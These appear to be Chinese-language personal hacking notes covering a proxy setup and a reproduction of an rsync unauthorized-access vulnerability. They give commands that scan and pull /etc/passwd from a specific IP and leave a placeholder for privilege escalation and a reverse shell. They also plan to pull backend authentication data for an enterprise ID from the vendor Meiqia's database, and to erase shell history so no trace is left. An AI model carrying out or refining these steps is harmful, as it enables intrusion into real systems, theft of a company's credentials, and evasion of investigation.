## 目的

自己创建一个机器，进行攻击

https://zhuanlan.zhihu.com/p/389200456

linux 配置海外 代理

https://xie.infoq.cn/article/7d47c548c916e8ceef55ee596

安装 trojan 和 proxychains 

复现：“rsync未授权访问漏洞”
地址： https://github.com/vulhub/vulhub/

环境搭建： https://github.com/vulhub/vulhub/

复现： https://blog.csdn.net/weixin_44110913/article/details/109545122

nmap -p 873  175.178.234.145
rsync   175.178.234.145::
rsync rsync://175.178.234.145/src
<!--  下载 -->
rsync -av rsync://175.178.234.145/src/etc/passwd ./
<!--  提权、反弹shell -->

linux 禁止ping

```text
1. 临时允许PING操作的命令为：
#echo 0 >/proc/sys/net/ipv4/icmp_echo_ignore_all
2. 永久允许PING配置方法
/etc/sysctl.conf中增加一行
net.ipv4.icmp_echo_ignore_all=0
sysctl -p
```

查看一下linux服务器经常登录的ip地址
在查询一下美洽服务商 的数据库信息，拉去下来，搜索到对应的 企业id的后台 认证信息

### 清楚 历史记录

先将 history 信息导出到 history_last.md

ln -sf /dev/null ~/.bash_history && history -c && exit
echo "unset HISTFILE" >> /etc/profile

### 显示最近用户登录信息

last -10

将这些信息导出到  last_user.md


